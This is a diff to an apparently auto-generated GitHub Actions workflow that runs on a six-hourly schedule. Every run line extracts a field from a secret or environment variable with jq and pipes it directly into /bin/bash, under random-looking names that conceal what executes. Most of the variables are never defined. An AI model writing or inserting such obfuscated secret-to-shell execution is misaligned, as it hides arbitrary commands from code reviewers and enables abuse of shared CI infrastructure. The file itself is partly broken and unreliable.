@@ -1,35 +1,25 @@
 name: nkchla
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
-
+    - cron: '45 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nkchla
         env:
-          kb53: ${{ secrets.kb53 }}
+          oa1: ${{ secrets.oa1 }}
         run: |
-          echo $kb53 | jq -r .is924 | /bin/bash
-          echo $o93750 | jq -r .fpp748 | /bin/bash
-          echo $xdj3 | jq -r .nbn87 | /bin/bash
-          echo $cnlf001 | jq -r .fy51606 | /bin/bash
-          echo $laohs19 | jq -r .t0872 | /bin/bash
-          echo $tysb15656 | jq -r .gqmhv07206 | /bin/bash
-          echo $gld82 | jq -r .mfwuj86473 | /bin/bash
-          echo $zon75 | jq -r .elnq324 | /bin/bash
-          echo $sig66 | jq -r .syf122 | /bin/bash
-          echo $w98364 | jq -r .o14 | /bin/bash
-          echo $sps421 | jq -r .zbwq32 | /bin/bash
-          echo $wc7 | jq -r .se923 | /bin/bash
-          echo $or24 | jq -r .bwby5057 | /bin/bash
-          echo $bgud93183 | jq -r .cnes381 | /bin/bash
-          echo $d28 | jq -r .qiwf2401 | /bin/bash
-          echo $rduam420 | jq -r .xxgxn26232 | /bin/bash
-          echo $t682 | jq -r .gz78667 | /bin/bash
-          echo $cud59 | jq -r .mq2136 | /bin/bash
+          echo $oa1 | jq -r .knb82427 | /bin/bash
+          echo $domkd02308 | jq -r .npk2375 | /bin/bash
+          echo $v840 | jq -r .qr4 | /bin/bash
+          echo $hm57 | jq -r .e92 | /bin/bash
+          echo $junnu50 | jq -r .xcx5438 | /bin/bash
+          echo $n4502 | jq -r .e87 | /bin/bash
+          echo $rvn510 | jq -r .pxmj9695 | /bin/bash
+          echo $gisl0025 | jq -r .f31 | /bin/bash
+          echo $hfc35 | jq -r .szqi3457 | /bin/bash
 
